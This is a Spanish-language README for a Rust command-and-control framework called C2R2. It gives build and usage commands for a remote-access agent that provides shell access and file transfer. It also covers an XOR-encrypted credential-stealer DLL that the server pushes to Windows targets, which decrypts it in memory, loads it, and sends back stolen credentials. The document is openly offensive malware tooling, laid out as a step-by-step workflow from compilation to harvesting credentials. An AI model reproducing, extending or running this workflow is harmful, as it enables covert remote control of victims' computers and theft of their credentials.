# C2R2 Builder v2.0

Generador de agentes y módulos para C2R2.

## 🎯 Funcionalidad

El builder tiene dos comandos principales:

### 1. `build-agent` - Genera el Agent Base

Crea un agente ligero (~500 KB) con funcionalidad básica del C2:
- Conexión directa al servidor
- Comandos shell
- Upload/Download archivos
- **NO incluye** stealer ni otros módulos pesados

### 2. `encrypt-module` - Genera Módulo Stealer

Encripta `stealer.dll` con XOR y lo prepara para ser usado con `/harvest`:
- Lee `target/release/stealer.dll`
- Genera clave XOR aleatoria de 32 bytes
- Encripta DLL
- Guarda `c2r2-server/modules/stealer.enc` y `stealer.key`

## 📋 Prerequisitos

### Instalar MinGW-w64 (cross-compilation para Windows)

```bash
# En Linux/WSL
sudo apt install mingw-w64

# Agregar target de Windows a Rust
rustup target add x86_64-pc-windows-gnu
```

### Compilar la DLL de stealer

```bash
# IMPORTANTE: Usar --target para generar DLL (Windows), no .so (Linux)
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# Esto genera: target/x86_64-pc-windows-gnu/release/stealer.dll (~2 MB)
```

## 🚀 Uso

### Generar Agent

```bash
cd builder

# Agent básico (localhost)
cargo run -- build-agent --name test_agent --server 127.0.0.1:4444

# Agent para producción
cargo run -- build-agent --name prod_agent --server 192.168.1.100:4444
```

### Generar Módulo Stealer

```bash
cd builder

# Encriptar stealer.dll
cargo run -- encrypt-module
```

## 📦 Archivos Generados

### `build-agent`

```
{nombre}.exe                 ← Ejecutable del agent (~500 KB)
agent/src/config.rs          ← Configuración del C2 (generada)
```

### `encrypt-module`

```
c2r2-server/modules/
├── stealer.enc              ← DLL encriptada (XOR, ~2 MB)
└── stealer.key              ← Clave XOR (32 bytes)
```

## 🔒 Arquitectura Modular

### Flujo de `/harvest`

```
C2R2[1]> /harvest

1. Servidor sube stealer.enc al agent  (vía /upload interno)
2. Servidor sube stealer.key al agent
3. Servidor envía comando __HARVEST__
4. Agent desencripta DLL en memoria (XOR)
5. Agent ejecuta LoadLibrary + steal_credentials()
6. Agent retorna credenciales (Base64)
7. Agent limpia archivos temporales
```

## 🛠️ Workflow Completo

```bash
# 1. Compilar stealer DLL (Windows target desde Linux)
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# 2. Encriptar módulo
cd builder
cargo run -- encrypt-module

# 3. Generar agent
cargo run -- build-agent --name my_agent --server 10.0.0.5:4444

# 4. Ejecutar servidor C2
cd ../c2r2-server
cargo run --release -- --bind 0.0.0.0 --port 4444

# 5. Ejecutar agent en target Windows
# (Transferir my_agent.exe a Windows)
.\my_agent.exe

# 6. Desde C2, ejecutar /harvest
C2R2> /select 1
C2R2[1]> /harvest
```

## 📝 Notas

- El agent **NO** incluye código de stealer (más ligero: ~500 KB vs 2.5 MB)
- El módulo se transfiere **solo cuando se ejecuta** `/harvest`
- Los archivos `.enc` y `.key` NO están en Git (se generan localmente)
- El servidor debe tener `modules/stealer.enc` y `modules/stealer.key` antes de ejecutar `/harvest`
